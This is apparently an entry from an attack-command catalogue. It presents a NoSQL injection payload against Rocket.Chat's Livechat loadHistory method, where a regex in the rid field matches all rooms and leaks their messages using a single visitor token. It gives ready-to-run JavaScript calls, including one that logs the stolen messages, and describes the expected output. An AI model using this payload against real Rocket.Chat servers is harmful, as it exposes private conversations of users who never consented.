---
data: 'Meteor.call(''livechat:loadHistory'', { token, rid: {"$regex":".*"} });'
tags:
  - nosql-injection
  - data-leak
type: command
output: Array of message objects
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:25.798Z'
id: ea991549-b2c8-4ea3-a08f-6b55b78304ee
verified: false
validated: true
submitted: true
---
# meteor-call-livechat-loadhistory-regex

## Command

```javascript
Meteor.call('livechat:loadHistory', { token, rid: {"$regex":".*"} });
```

## Description

Calls Rocket.Chat's Livechat history load method with NoSQL injection in `rid` to match all rooms, leaking messages using a valid token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| token | Valid visitor token string | Yes |
| rid | Injection payload {"$regex":".*"} to match any room | Yes |

## Examples

### Basic Usage

```javascript
Meteor.call('livechat:loadHistory', { token: 'abc123', rid: {"$regex":".*"} });
```

### Advanced Usage

```javascript
Meteor.call('livechat:loadHistory', { token: 'abc123', rid: {"$regex":"^room.*"} }, (err, msgs) => { console.log(msgs); });
```

## Expected Output

Array of messages: `[{ _id: 'msg1', msg: 'text', ts: 'timestamp', ... }, ...]`.

## Related

- [[Related Procedure: Leak-Livechat-Messages-via-NoSQL-Injection]]
